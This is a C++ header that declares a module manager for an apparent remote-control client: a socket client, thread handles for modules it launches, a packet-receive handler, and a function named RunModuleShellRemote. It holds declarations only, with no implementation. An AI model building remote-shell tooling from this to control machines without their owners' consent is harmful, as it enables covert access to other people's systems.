#pragma once


//class CModule {
//
//	CModule();
//	~CModule();
//
//	virtual void OnRecvivePacket();
//
//
//	void WaitForClose();
//
//
//
//
//};
//


#include "Packet.h"
#include "SocketClient.h"

#define MAX_THREAD_FOR_MODULE 8192


class CPacket;
class CSocketClient;



class CModuleManage {

public:
	CSocketClient*		m_pMainSocketClient;

	HANDLE				m_ahThread[MAX_THREAD_FOR_MODULE];		// 存放组件启动的线程句柄
	DWORD				m_dwThreadNum;


public:
	CModuleManage(CSocketClient* m_pMainSocketClient);
	~CModuleManage();

	void OnReceivePacket(CPacket* pPacket);

};




DWORD WINAPI RunModuleShellRemote(CPacket* pPacket);